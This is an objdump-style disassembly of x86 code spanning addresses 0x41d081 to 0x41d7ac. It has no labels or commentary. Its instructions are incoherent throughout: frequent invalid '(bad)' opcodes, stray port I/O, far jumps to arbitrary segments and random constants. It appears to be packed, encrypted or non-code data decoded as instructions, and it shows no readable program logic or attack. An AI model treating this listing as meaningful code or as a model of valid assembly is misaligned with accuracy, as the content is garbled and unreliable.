  41d081:	add    ch,BYTE PTR [ebp-0x3726d658]
  41d087:	jbe    0x41d0d4
  41d089:	adc    eax,0xaeb8eead
  41d08e:	sub    cl,ch
  41d090:	or     al,0x61
  41d092:	leave  
  41d093:	ret    0xa057
  41d096:	mov    ds:0x151267fa,al
  41d09b:	or     edx,ebp
  41d09d:	xor    dl,cl
  41d09f:	push   esi
  41d0a0:	cs inc edx
  41d0a2:	mov    edi,0x774b24c7
  41d0a7:	ins    DWORD PTR es:[edi],dx
  41d0a8:	mov    eax,ds:0x1eaec5b1
  41d0ad:	out    0xff,al
  41d0af:	loopne 0x41d102
  41d0b1:	adc    DWORD PTR [esi+0x35a7276f],ebp
  41d0b7:	jge    0x41d058
  41d0b9:	sbb    bh,dl
  41d0bb:	imul   DWORD PTR [ebx-0x22]
  41d0be:	mov    bl,BYTE PTR [ebx]
  41d0c0:	mov    ebp,0x471a9da1
  41d0c5:	push   ds
  41d0c6:	pop    ebx
  41d0c7:	sbb    BYTE PTR [esi],0x8
  41d0ca:	into   
  41d0cb:	sbb    al,0xe8
  41d0cd:	inc    edx
  41d0ce:	adc    al,0x21
  41d0d0:	add    eax,0x583f2fe7
  41d0d5:	popa   
  41d0d6:	xor    eax,0x99757364
  41d0db:	mov    BYTE PTR [ecx-0x6e],ch
  41d0de:	retf   0x1cc3
  41d0e1:	pop    ecx
  41d0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0e3:	mov    dl,0x82
  41d0e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0e6:	mov    al,0x17
  41d0e8:	out    dx,eax
  41d0e9:	pop    DWORD PTR [ebx+0x9eaf354]
  41d0ef:	test   al,0x44
  41d0f1:	shr    DWORD PTR [esi-0x76],cl
  41d0f4:	fist   DWORD PTR ds:0x75f8b51e
  41d0fa:	sub    BYTE PTR [ecx-0x21],dh
  41d0fd:	dec    esp
  41d0fe:	mov    ah,0xeb
  41d100:	loope  0x41d120
  41d102:	mov    eax,edx
  41d104:	out    0x26,eax
  41d106:	nop
  41d107:	xchg   ebx,eax
  41d108:	xchg   esi,eax
  41d109:	sub    DWORD PTR [ecx],0xffffffa1
  41d10c:	or     DWORD PTR [ebx-0x64],edx
  41d10f:	mov    bl,0x94
  41d111:	pop    edx
  41d112:	out    0x9c,al
  41d114:	(bad)
  41d117:	xchg   BYTE PTR [ebp+0x686e58dd],ch
  41d11d:	adc    bh,BYTE PTR [ecx+0x48]
  41d120:	or     DWORD PTR [edi-0x3dbc0441],0x52
  41d127:	rcl    BYTE PTR [edi-0x4a69c6a],cl
  41d12d:	call   0x91eb8f1f
  41d132:	out    0xfa,al
  41d134:	jl     0x41d0c6
  41d136:	jp     0x41d0ee
  41d138:	jno    0x41d174
  41d13a:	outs   dx,BYTE PTR ds:[esi]
  41d13b:	and    edx,esi
  41d13d:	push   esi
  41d13e:	mov    ah,0xc5
  41d140:	(bad)
  41d144:	test   DWORD PTR [ebp+0x6f081ac9],esi
  41d14a:	nop
  41d14b:	cdq    
  41d14c:	or     dh,BYTE PTR [ebx]
  41d14e:	add    bl,ch
  41d150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d151:	dec    ecx
  41d152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	dec    esp
  41d155:	jg     0x41d14a
  41d157:	std    
  41d158:	test   DWORD PTR [edi+0xe],eax
  41d15b:	pop    ecx
  41d15c:	mov    ds:0x2738637,al
  41d161:	(bad)  
  41d162:	(bad)  
  41d163:	ins    DWORD PTR es:[edi],dx
  41d164:	js     0x41d198
  41d166:	sbb    eax,0x24b3a57b
  41d16b:	ins    DWORD PTR es:[edi],dx
  41d16c:	pop    ebx
  41d16d:	push   0x27
  41d16f:	adc    BYTE PTR [eax],bh
  41d171:	out    0x2b,al
  41d173:	pusha  
  41d174:	push   esi
  41d175:	dec    edx
  41d176:	xchg   esp,eax
  41d177:	mov    edx,0x702e89d1
  41d17c:	mov    eax,DWORD PTR [esi+0x32]
  41d17f:	mov    eax,ds:0xc0887481
  41d184:	daa    
  41d185:	out    dx,eax
  41d186:	push   eax
  41d187:	es daa 
  41d189:	inc    ebx
  41d18a:	in     al,0xee
  41d18c:	(bad)  
  41d18d:	jb     0x41d1b0
  41d18f:	or     eax,0x711fa1e0
  41d194:	add    ebp,DWORD PTR [edi+0x3]
  41d197:	push   edi
  41d198:	or     eax,0x3e3e84ba
  41d19d:	push   ebx
  41d19e:	mov    DWORD PTR [ebp-0x5666372c],esi
  41d1a4:	push   es
  41d1a5:	ficomp DWORD PTR [edx-0x29073d9e]
  41d1ab:	mov    edx,gs
  41d1ad:	push   0xffffffcf
  41d1af:	faddp  st(1),st
  41d1b1:	out    dx,al
  41d1b2:	xchg   esi,eax
  41d1b3:	sbb    BYTE PTR [ebp-0x36729b24],bh
  41d1b9:	sbb    al,0x46
  41d1bb:	ret    0xd6fb
  41d1be:	aad    0x49
  41d1c0:	mov    ebx,0xd7df4a4d
  41d1c5:	pop    edi
  41d1c6:	(bad)  
  41d1c7:	fldenv [eax-0x30e1ec48]
  41d1cd:	(bad)  
  41d1ce:	icebp  
  41d1cf:	mov    ah,0x29
  41d1d1:	jle    0x41d158
  41d1d3:	ins    DWORD PTR es:[edi],dx
  41d1d4:	sbb    DWORD PTR cs:[esp+ebx*4+0x1d],0xffffffe3
  41d1da:	outs   dx,DWORD PTR ds:[esi]
  41d1db:	push   0x74
  41d1dd:	lods   eax,DWORD PTR ds:[esi]
  41d1de:	cwde   
  41d1df:	lods   eax,DWORD PTR es:[esi]
  41d1e1:	fisub  DWORD PTR [ebx+ebx*2-0x2]
  41d1e5:	jmp    0xab5:0x7429926a
  41d1ec:	sbb    eax,0x1ae1b4c1
  41d1f1:	pusha  
  41d1f2:	jbe    0x41d196
  41d1f4:	mov    WORD PTR [ecx-0x6298ed72],fs
  41d1fa:	ins    DWORD PTR es:[edi],dx
  41d1fb:	dec    esi
  41d1fc:	jmp    0xb25e:0xe52ade85
  41d203:	dec    edi
  41d204:	icebp  
  41d205:	xchg   ebp,eax
  41d206:	jmp    0x41d1e1
  41d208:	cdq    
  41d209:	test   al,0x36
  41d20b:	jo     0x41d1ab
  41d20d:	hlt    
  41d20e:	imul   edx,edi,0xffffffdf
  41d211:	das    
  41d212:	(bad)  
  41d213:	mov    edi,0xac686fed
  41d218:	mov    DWORD PTR [edi-0x54938fb0],edx
  41d21e:	xor    bl,bh
  41d220:	cmp    DWORD PTR gs:[ebp+0x12],ebp
  41d224:	pop    edx
  41d225:	rcl    BYTE PTR [eax+eiz*2],0x81
  41d229:	xor    BYTE PTR [ecx],cl
  41d22b:	adc    eax,0xb49e0e1b
  41d230:	xchg   DWORD PTR [ecx-0x53],ecx
  41d233:	call   0x50df12b4
  41d238:	cmp    bl,BYTE PTR [eax]
  41d23a:	sub    DWORD PTR [ecx-0x69],edx
  41d23d:	mov    dl,0xdc
  41d23f:	push   edx
  41d240:	in     eax,dx
  41d241:	jnp    0x41d26b
  41d243:	inc    BYTE PTR [esi]
  41d245:	and    BYTE PTR [bx+di],bh
  41d248:	out    dx,al
  41d249:	jmp    FWORD PTR [esi]
  41d24b:	pop    es
  41d24c:	xor    edx,DWORD PTR [ebp-0x6110087a]
  41d252:	or     al,0xd3
  41d254:	pop    eax
  41d255:	dec    ecx
  41d256:	and    ebx,DWORD PTR [ebx+0x5b]
  41d259:	(bad)  
  41d25a:	push   ecx
  41d25b:	dec    ebp
  41d25c:	dec    esp
  41d25d:	inc    edi
  41d25e:	(bad)  
  41d260:	iret   
  41d261:	or     DWORD PTR ss:[ebp+0x9],edx
  41d265:	cmp    BYTE PTR [edi+0x53],0xfa
  41d269:	mov    al,0xb3
  41d26b:	sub    al,0xdd
  41d26d:	or     edx,DWORD PTR [ecx-0x124e26a]
  41d273:	push   es
  41d274:	mov    ch,0x4f
  41d276:	in     eax,dx
  41d277:	fwait
  41d278:	out    0x86,eax
  41d27a:	out    0xb8,al
  41d27c:	stos   DWORD PTR es:[edi],eax
  41d27d:	imul   edx,DWORD PTR [edi-0x412d47d],0x9
  41d284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d285:	lods   eax,DWORD PTR ds:[esi]
  41d286:	fmul   st,st(7)
  41d288:	mov    cl,0x77
  41d28a:	xor    al,BYTE PTR [ebx]
  41d28c:	mov    al,0x4f
  41d28e:	or     BYTE PTR [ebp-0x58],0x13
  41d292:	sahf   
  41d293:	lea    eax,[ecx]
  41d295:	jp     0x41d2d1
  41d297:	fucom  st(6)
  41d299:	jecxz  0x41d314
  41d29b:	inc    ebx
  41d29c:	mov    ebp,DWORD PTR [esi-0x5]
  41d29f:	int3   
  41d2a0:	inc    ebp
  41d2a1:	pop    edx
  41d2a2:	adc    bh,dh
  41d2a4:	jnp    0x41d2be
  41d2a6:	retf   
  41d2a7:	sub    BYTE PTR [edi],bl
  41d2a9:	test   eax,0x1e6b289e
  41d2ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2af:	out    dx,eax
  41d2b0:	mov    bl,0x69
  41d2b2:	rcl    BYTE PTR [edx+0x36],1
  41d2b5:	not    DWORD PTR [eax+0xe915610]
  41d2bb:	mov    ebp,0x12909e8b
  41d2c0:	mov    bh,0xc1
  41d2c2:	mov    dl,0x3a
  41d2c4:	cli    
  41d2c5:	stos   DWORD PTR es:[edi],eax
  41d2c6:	mov    DWORD PTR [eax+0x45],edi
  41d2c9:	and    al,0x2b
  41d2cb:	clc    
  41d2cc:	push   ecx
  41d2cd:	jp     0x41d2d8
  41d2cf:	stos   DWORD PTR es:[edi],eax
  41d2d0:	and    dh,bh
  41d2d2:	call   0xeeee:0xe2226811
  41d2d9:	cmp    eax,0x269c136
  41d2de:	js     0x41d2c5
  41d2e0:	into   
  41d2e1:	outs   dx,BYTE PTR ds:[esi]
  41d2e2:	jb     0x41d2cc
  41d2e4:	in     eax,dx
  41d2e5:	xchg   ebx,eax
  41d2e6:	adc    esp,DWORD PTR [edi+0x56]
  41d2e9:	pusha  
  41d2ea:	sub    DWORD PTR [ebp-0x2e],0xfffffffd
  41d2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2ef:	out    dx,eax
  41d2f0:	jae    0x41d2ed
  41d2f2:	xchg   DWORD PTR [esi-0x30cdffd6],ecx
  41d2f8:	adc    al,0x3
  41d2fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2fb:	mov    al,0x80
  41d2fd:	push   ebx
  41d2fe:	pop    ebp
  41d2ff:	call   0x156764cf
  41d304:	mov    ch,0x7e
  41d306:	push   edi
  41d307:	xor    BYTE PTR [edx],al
  41d309:	push   ebx
  41d30a:	xchg   BYTE PTR [esi],bh
  41d30c:	xlat   BYTE PTR cs:[ebx]
  41d30e:	add    eax,0xda6dd08f
  41d313:	retf   0xa60c
  41d316:	jle    0x41d2da
  41d318:	xor    BYTE PTR [ebx+0x6f],ch
  41d31b:	or     ecx,eax
  41d31d:	loop   0x41d338
  41d31f:	pop    eax
  41d320:	out    0xa7,eax
  41d322:	xchg   bl,bl
  41d324:	xchg   DWORD PTR [ecx+0x5b],eax
  41d327:	outs   dx,DWORD PTR ds:[esi]
  41d328:	dec    edi
  41d329:	mov    ebx,0xfd8401f9
  41d32e:	add    cl,BYTE PTR [ebx+ecx*1+0x6c]
  41d332:	or     al,0x57
  41d334:	inc    ebp
  41d335:	outs   dx,DWORD PTR ds:[esi]
  41d336:	inc    ebx
  41d337:	jno    0x41d2e8
  41d339:	not    esp
  41d33b:	xchg   ebx,eax
  41d33c:	mov    dh,BYTE PTR [ecx-0x45e35e0]
  41d342:	test   al,0x49
  41d344:	call   0x7948:0xc8732c72
  41d34b:	scas   al,BYTE PTR es:[edi]
  41d34c:	jecxz  0x41d3b9
  41d34e:	mov    al,ds:0x2a1759b9
  41d353:	out    dx,eax
  41d354:	mov    ch,dl
  41d356:	clc    
  41d357:	icebp  
  41d358:	push   ss
  41d359:	mov    BYTE PTR [edx+0x46],cl
  41d35c:	dec    edx
  41d35d:	xchg   ecx,eax
  41d35e:	inc    esp
  41d35f:	scas   al,BYTE PTR es:[edi]
  41d360:	das    
  41d361:	retf   
  41d362:	leave  
  41d363:	gs cmp eax,0xb3a2834f
  41d369:	inc    ebx
  41d36a:	sahf   
  41d36b:	retf   0xc501
  41d36e:	xor    DWORD PTR [edi+0x1177bae9],ecx
  41d374:	popf   
  41d375:	sub    eax,0xe7caabb
  41d37a:	mov    bl,0xe6
  41d37c:	fwait
  41d37d:	loope  0x41d302
  41d37f:	retf   
  41d380:	adc    eax,0x65bfb408
  41d385:	mov    dl,BYTE PTR [edx-0x43]
  41d388:	inc    esp
  41d389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d38a:	inc    ebx
  41d38b:	inc    ebp
  41d38c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d38d:	jecxz  0x41d390
  41d38f:	jmp    0x41d3e9
  41d391:	xlat   BYTE PTR ds:[ebx]
  41d392:	ins    BYTE PTR es:[edi],dx
  41d393:	cmp    eax,DWORD PTR [esi]
  41d395:	js     0x41d323
  41d397:	add    eax,0x505e2f87
  41d39c:	dec    ecx
  41d39d:	add    al,dh
  41d39f:	sub    edx,DWORD PTR [ebx-0x4e813935]
  41d3a5:	jge    0x41d32d
  41d3a7:	xchg   ah,dh
  41d3a9:	xor    edx,esp
  41d3ab:	adc    dh,BYTE PTR [edx-0x60]
  41d3ae:	sbb    BYTE PTR [esi],ch
  41d3b0:	test   edi,ebp
  41d3b2:	sbb    al,0x60
  41d3b4:	test   DWORD PTR [eax],edx
  41d3b6:	les    esi,FWORD PTR [esi]
  41d3b8:	inc    esi
  41d3b9:	mov    ds:0xc9bcae0a,eax
  41d3be:	idiv   cl
  41d3c0:	adc    bh,bh
  41d3c2:	repnz mov dl,0x91
  41d3c5:	xchg   edi,eax
  41d3c6:	popa   
  41d3c7:	push   es
  41d3c8:	jmp    0xcbda:0x53389098
  41d3cf:	fcom   DWORD PTR [ecx]
  41d3d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d2:	push   eax
  41d3d3:	lock sub DWORD PTR [edi],0x1e96cc29
  41d3da:	test   eax,0xcdfb28c8
  41d3df:	dec    eax
  41d3e0:	cmp    al,0x5a
  41d3e2:	xchg   ebx,eax
  41d3e3:	adc    eax,0xf1b1c0fb
  41d3e8:	imul   edi,DWORD PTR [edx+0x65d87623],0x87f71487
  41d3f2:	mov    dh,0xa
  41d3f4:	jno    0x41d438
  41d3f6:	call   0x5d7777d8
  41d3fb:	push   edi
  41d3fc:	inc    esi
  41d3fd:	shl    dh,cl
  41d3ff:	in     al,0x5b
  41d401:	mul    eax
  41d403:	inc    ecx
  41d404:	mov    eax,ds:0x8c8e3ba0
  41d409:	push   cs
  41d40a:	push   ecx
  41d40b:	mov    fs,WORD PTR [ecx+0x36]
  41d40e:	int    0xc8
  41d410:	sub    DWORD PTR [ebx+0x69],0xcf4b6c3f
  41d417:	pop    ebx
  41d418:	fild   WORD PTR [ebp+0x3c6f9182]
  41d41e:	push   eax
  41d41f:	cmp    eax,0x118b569e
  41d424:	xor    BYTE PTR [ebx+0x3c489e74],ah
  41d42a:	popa   
  41d42b:	sub    al,0x28
  41d42d:	pop    esp
  41d42e:	lods   eax,DWORD PTR ds:[esi]
  41d42f:	test   DWORD PTR [ebx],edx
  41d431:	sbb    al,0x4d
  41d433:	call   0x439983ee
  41d438:	or     bh,BYTE PTR [edi+0x74]
  41d43b:	mov    eax,0xe8074786
  41d440:	fs adc eax,0x211bcfd5
  41d446:	stos   BYTE PTR es:[edi],al
  41d447:	push   esi
  41d448:	push   esp
  41d449:	les    eax,FWORD PTR [edi]
  41d44b:	gs sub eax,0x83e7b79
  41d451:	mov    ebx,0x1bb3aae
  41d456:	inc    esp
  41d457:	loopne 0x41d492
  41d459:	sti    
  41d45a:	jp     0x41d443
  41d45c:	pushf  
  41d45d:	and    ah,BYTE PTR [ebx+0x4f]
  41d460:	ins    BYTE PTR es:[edi],dx
  41d461:	mov    esi,eax
  41d463:	shl    al,cl
  41d465:	jmp    0xbe815202
  41d46a:	mov    bl,0x4e
  41d46c:	sub    ch,0x25
  41d46f:	std    
  41d470:	mov    eax,ds:0x486f0397
  41d475:	sahf   
  41d476:	adc    eax,0x1c0d6764
  41d47b:	sbb    eax,0x780878ac
  41d480:	lea    edi,[esi]
  41d482:	mov    esp,esi
  41d484:	inc    eax
  41d485:	pop    ss
  41d486:	stos   DWORD PTR es:[edi],eax
  41d487:	scas   al,BYTE PTR es:[edi]
  41d488:	xor    eax,0x9e299583
  41d48d:	cmp    bh,BYTE PTR [edi+0x12746432]
  41d493:	pop    es
  41d494:	shl    DWORD PTR ds:0x585196ba,1
  41d49a:	push   0xb35ca051
  41d49f:	sahf   
  41d4a0:	or     DWORD PTR [ebx],edi
  41d4a2:	lods   eax,DWORD PTR ds:[esi]
  41d4a3:	clc    
  41d4a4:	shl    BYTE PTR [eax+ecx*8-0xdeeb31f],0x54
  41d4ac:	test   BYTE PTR [esi+0x213b32da],0xdd
  41d4b3:	add    esp,DWORD PTR [eax-0x75cf4756]
  41d4b9:	push   ebx
  41d4ba:	mov    ebp,0x76301605
  41d4bf:	xchg   DWORD PTR [ebp-0x1fcbe3d9],ebp
  41d4c5:	mov    al,ds:0x83011821
  41d4ca:	ret    0x3726
  41d4cd:	imul   edi,esp,0x4f
  41d4d0:	aaa    
  41d4d1:	or     eax,DWORD PTR [esi]
  41d4d3:	sbb    DWORD PTR [esi],edi
  41d4d5:	xchg   ebx,eax
  41d4d6:	fmul   QWORD PTR [eax-0x28]
  41d4d9:	aam    0x5f
  41d4db:	fisttp WORD PTR [edx]
  41d4dd:	add    edi,DWORD PTR [edi+ebx*8-0x69779edf]
  41d4e4:	aaa    
  41d4e5:	or     ch,dh
  41d4e7:	sub    BYTE PTR [edx],dl
  41d4e9:	arpl   WORD PTR [esi],bp
  41d4eb:	push   cs
  41d4ec:	dec    esi
  41d4ed:	into   
  41d4ee:	lds    eax,FWORD PTR [edi-0x38]
  41d4f1:	sbb    eax,0xbe78bc78
  41d4f6:	jle    0x41d541
  41d4f8:	inc    eax
  41d4f9:	mov    edi,0x9532a9c6
  41d4fe:	adc    al,0x87
  41d500:	and    al,0xfb
  41d503:	or     BYTE PTR [edi-0x6a],dl
  41d506:	inc    ebx
  41d507:	and    al,0xa8
  41d509:	out    dx,eax
  41d50a:	jmp    0xd9e6:0xc0c1e876
  41d511:	xor    esi,eax
  41d513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d514:	loope  0x41d584
  41d516:	(bad)  
  41d517:	int3   
  41d518:	fbstp  TBYTE PTR ds:0x5e2fdfa2
  41d51e:	jle    0x41d55f
  41d520:	mov    ecx,0xd30fd9c6
  41d525:	mov    ecx,DWORD PTR [ecx]
  41d527:	or     DWORD PTR [ebp+esi*4-0x48],0xfffffff8
  41d52c:	outs   dx,BYTE PTR gs:[esi]
  41d52e:	sub    DWORD PTR gs:[ecx-0x2],eax
  41d532:	mov    es,esi
  41d534:	adc    BYTE PTR [edi+0x632ca4de],ch
  41d53a:	and    eax,0x7c2d7ba1
  41d53f:	stos   BYTE PTR es:[edi],al
  41d540:	dec    esi
  41d541:	mov    ch,0xb9
  41d543:	imul   DWORD PTR [edi]
  41d545:	xor    al,0x7d
  41d547:	(bad)  
  41d548:	jae    0x41d532
  41d54a:	and    BYTE PTR [ebx-0x3d],ch
  41d54d:	les    ebx,FWORD PTR [ebx+0x5f]
  41d550:	sti    
  41d551:	push   0x6b
  41d553:	enter  0x7326,0x39
  41d557:	pop    ebp
  41d558:	mov    dh,0x5c
  41d55a:	lea    ecx,[esi*8+0x426a76e]
  41d561:	(bad)  
  41d562:	pusha  
  41d563:	repnz bound ebp,QWORD PTR [ecx]
  41d566:	retf   0xdd7d
  41d569:	cmc    
  41d56a:	das    
  41d56b:	imul   ebx,DWORD PTR [ebx],0x55
  41d56e:	inc    eax
  41d56f:	and    eax,0xc7288769
  41d574:	cmp    DWORD PTR [edi],edx
  41d576:	les    esi,FWORD PTR [eax+0x48b97dcb]
  41d57c:	pop    ecx
  41d57d:	pop    ebp
  41d57e:	pusha  
  41d57f:	std    
  41d580:	repz (bad) 
  41d583:	adc    al,0xe3
  41d585:	push   ebp
  41d586:	add    DWORD PTR [edx],esp
  41d588:	mov    ebx,?
  41d58a:	rcl    DWORD PTR [edx-0x54a2ac0c],0x17
  41d591:	repz test eax,0x4fcd6bc1
  41d597:	cli    
  41d598:	dec    eax
  41d599:	cmp    cl,BYTE PTR [esi+0x5e]
  41d59c:	xchg   edi,eax
  41d59d:	inc    BYTE PTR [ebx]
  41d59f:	fist   WORD PTR [ebp-0x72]
  41d5a2:	(bad)  
  41d5a3:	addps  xmm0,XMMWORD PTR [eax+0x3488e0e0]
  41d5aa:	mov    ebx,0x39769532
  41d5af:	jl     0x41d5cb
  41d5b1:	daa    
  41d5b2:	cld    
  41d5b3:	pop    ecx
  41d5b4:	mov    al,0x78
  41d5b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b7:	and    BYTE PTR ds:[edx+edi*2],dh
  41d5bb:	fnstsw WORD PTR [ebp+0x5c7b7dcc]
  41d5c1:	dec    esp
  41d5c2:	sar    DWORD PTR [edx-0x1],cl
  41d5c5:	sub    ebx,DWORD PTR [edi+edx*4]
  41d5c8:	push   eax
  41d5c9:	ins    DWORD PTR es:[edi],dx
  41d5ca:	mov    cl,0x41
  41d5cc:	dec    edi
  41d5cd:	fstp   st(1)
  41d5cf:	xchg   esi,eax
  41d5d0:	mov    ebx,0x10384b6e
  41d5d5:	loop   0x41d631
  41d5d7:	xchg   edi,eax
  41d5d8:	popf   
  41d5d9:	mov    al,ds:0x555768b9
  41d5de:	fwait
  41d5df:	repz loop 0x41d632
  41d5e2:	xor    al,BYTE PTR [edx]
  41d5e4:	cmp    eax,0x65ed4958
  41d5e9:	mov    ebp,0x498c529c
  41d5ee:	inc    esi
  41d5ef:	mov    ch,BYTE PTR [eax]
  41d5f1:	pop    ecx
  41d5f2:	add    dl,BYTE PTR [edx]
  41d5f4:	fdiv   DWORD PTR [eax+ecx*2]
  41d5f7:	scas   al,BYTE PTR es:[edi]
  41d5f8:	push   esi
  41d5f9:	test   eax,0x36d0f46
  41d5fe:	out    0x95,eax
  41d600:	pop    esi
  41d601:	enter  0x235f,0x63
  41d605:	push   edx
  41d606:	int3   
  41d607:	and    DWORD PTR [edx-0x12c1505e],esi
  41d60d:	dec    ecx
  41d60e:	inc    DWORD PTR [ecx-0x20]
  41d611:	adc    DWORD PTR [edi],ebx
  41d613:	xchg   ecx,eax
  41d614:	out    0x7c,al
  41d616:	int    0x5b
  41d618:	outs   dx,DWORD PTR ds:[esi]
  41d619:	push   DWORD PTR [ebx-0xdab3a8c]
  41d61f:	sbb    BYTE PTR [edi+0x62d2e970],dl
  41d625:	dec    esi
  41d626:	fs hlt 
  41d628:	loope  0x41d60a
  41d62a:	in     al,0x5e
  41d62c:	dec    eax
  41d62d:	mov    dh,0x29
  41d62f:	adc    eax,0xfef0e21a
  41d634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d635:	icebp  
  41d636:	cdq    
  41d637:	pop    ebp
  41d638:	xchg   DWORD PTR [edi+0x392578cf],ecx
  41d63e:	or     esp,ebp
  41d640:	popf   
  41d641:	xchg   ebp,eax
  41d642:	sub    dl,ch
  41d644:	aad    0x9f
  41d646:	sub    bh,dh
  41d648:	add    eax,0xa1dd2cdf
  41d64d:	aaa    
  41d64e:	mul    dh
  41d650:	dec    edx
  41d651:	cs cld 
  41d653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d654:	xchg   edi,eax
  41d655:	ja     0x41d602
  41d657:	pop    ss
  41d658:	pop    ebx
  41d659:	retf   
  41d65a:	aam    0x35
  41d65c:	jo     0x41d69d
  41d65e:	xor    DWORD PTR [ecx-0x49],eax
  41d661:	je     0x41d600
  41d663:	mov    ah,0xec
  41d665:	sub    BYTE PTR [esp+edi*4+0x75],0x91
  41d66a:	pop    es
  41d66b:	push   cs
  41d66c:	xchg   ebx,eax
  41d66d:	mov    bh,0xbe
  41d66f:	fucom  st(4)
  41d671:	xchg   esp,eax
  41d672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d673:	sbb    DWORD PTR [edi+ecx*1-0x24],0x699e14b2
  41d67b:	shl    BYTE PTR [ebp-0x70],1
  41d67e:	push   ebx
  41d67f:	dec    ebp
  41d680:	stos   BYTE PTR es:[edi],al
  41d681:	fmulp  st(0),st
  41d683:	jmp    FWORD PTR [ebp+0x4b048de0]
  41d689:	sub    bh,cl
  41d68b:	xchg   esi,eax
  41d68c:	pop    edi
  41d68d:	pop    edi
  41d68e:	xchg   ebp,eax
  41d68f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d690:	mov    dh,0x77
  41d692:	inc    ecx
  41d693:	imul   edi,DWORD PTR [edx-0x794ec28d],0x3c
  41d69a:	(bad)  
  41d69b:	cmp    eax,0xc8c9303d
  41d6a0:	inc    ecx
  41d6a1:	fwait
  41d6a2:	mov    cl,0x35
  41d6a4:	clc    
  41d6a5:	jg     0x41d662
  41d6a7:	xchg   ebx,eax
  41d6a8:	into   
  41d6a9:	inc    edx
  41d6aa:	pop    eax
  41d6ab:	outs   dx,DWORD PTR ds:[esi]
  41d6ac:	mov    WORD PTR [edi],gs
  41d6ae:	adc    eax,0x32480f07
  41d6b3:	push   esp
  41d6b4:	lods   al,BYTE PTR ds:[esi]
  41d6b5:	xor    al,0xa9
  41d6b7:	or     al,0xd1
  41d6b9:	ss (bad) 
  41d6bb:	popa   
  41d6bc:	ficomp WORD PTR [eax+0x28]
  41d6bf:	xchg   esp,eax
  41d6c0:	retf   
  41d6c1:	adc    BYTE PTR [esi-0x3160234a],cl
  41d6c7:	stos   BYTE PTR es:[edi],al
  41d6c8:	in     al,dx
  41d6c9:	popf   
  41d6ca:	mov    ds:0x7da94c53,al
  41d6cf:	cmc    
  41d6d0:	and    al,0x3f
  41d6d2:	fadd   st,st(6)
  41d6d4:	push   cs
  41d6d5:	cmp    al,0xa2
  41d6d7:	(bad)  
  41d6d8:	jo     0x41d698
  41d6da:	adc    eax,0x46a3648f
  41d6df:	loop   0x41d69f
  41d6e1:	rcr    BYTE PTR [edi],0xb9
  41d6e4:	aam    0xa4
  41d6e6:	jno    0x41d6fa
  41d6e8:	pop    esi
  41d6e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6ea:	stc    
  41d6eb:	gs pop sp
  41d6ee:	sub    WORD PTR [eax+eiz*8-0x52edee9],cx
  41d6f6:	adc    eax,0x7df2902
  41d6fb:	or     BYTE PTR [edi],0xba
  41d6fe:	ret    
  41d6ff:	push   ebx
  41d700:	xor    DWORD PTR [ecx+edx*1-0x71],ebx
  41d704:	inc    esi
  41d705:	adc    ebp,DWORD PTR [edx+0x0]
  41d708:	add    esp,DWORD PTR [eax-0x5b3db61b]
  41d70e:	int3   
  41d70f:	mov    esp,0xcec7a60a
  41d714:	add    ebp,ebx
  41d716:	jge    0x41d73d
  41d718:	sbb    ch,BYTE PTR [esi-0x61c9991e]
  41d71e:	push   ds
  41d71f:	popa   
  41d720:	cmp    eax,DWORD PTR [edi-0x7efa2b16]
  41d726:	in     eax,0x6e
  41d728:	jbe    0x41d748
  41d72a:	out    dx,al
  41d72b:	shl    BYTE PTR [esi],cl
  41d72d:	aam    0xbe
  41d72f:	inc    ebp
  41d730:	xchg   edx,eax
  41d731:	add    eax,0x625ce354
  41d736:	jmp    DWORD PTR [esi]
  41d738:	cmp    al,0x19
  41d73a:	mov    cs,WORD PTR [ebx+0x1]
  41d73d:	pop    ebx
  41d73e:	int3   
  41d73f:	mov    WORD PTR [ebx],?
  41d741:	lea    eax,[ebx+eiz*4-0x76]
  41d745:	fimul  DWORD PTR [ebx-0x46c4d5a8]
  41d74b:	and    bh,BYTE PTR [edi]
  41d74d:	add    BYTE PTR [edx-0xb],dl
  41d750:	or     BYTE PTR [edi],bh
  41d752:	mov    ds:0x86944437,al
  41d757:	jp     0x41d7ab
  41d759:	mov    dl,0x85
  41d75b:	int3   
  41d75c:	cwde   
  41d75d:	add    DWORD PTR [eax+0x2ab25a2e],ebp
  41d763:	and    eax,0xdc6ec79c
  41d768:	xchg   ebx,eax
  41d769:	adc    al,0x63
  41d76b:	xor    al,0x8b
  41d76d:	cmp    bl,dh
  41d76f:	jno    0x41d7c8
  41d771:	push   ds
  41d772:	adc    eax,0x5b37ff70
  41d777:	ins    BYTE PTR es:[edi],dx
  41d778:	fistp  DWORD PTR [esp+edi*1+0x18]
  41d77c:	adc    eax,0x935ba2d
  41d781:	in     al,0x72
  41d783:	test   eax,0x914f810d
  41d788:	cmp    al,0x1e
  41d78a:	and    dl,al
  41d78c:	loope  0x41d80b
  41d78e:	lock test eax,ebx
  41d791:	test   BYTE PTR [edi],dh
  41d793:	dec    ecx
  41d794:	push   ebx
  41d795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d797:	imul   esp,edx,0xffffffa5
  41d79a:	and    eax,0x56d0c6b7
  41d79f:	pop    edi
  41d7a0:	sar    DWORD PTR [eax+0x42768b02],1
  41d7a6:	xchg   esi,eax
  41d7a7:	cmp    eax,0x1522e9c8
  41d7ac:	out    dx,al
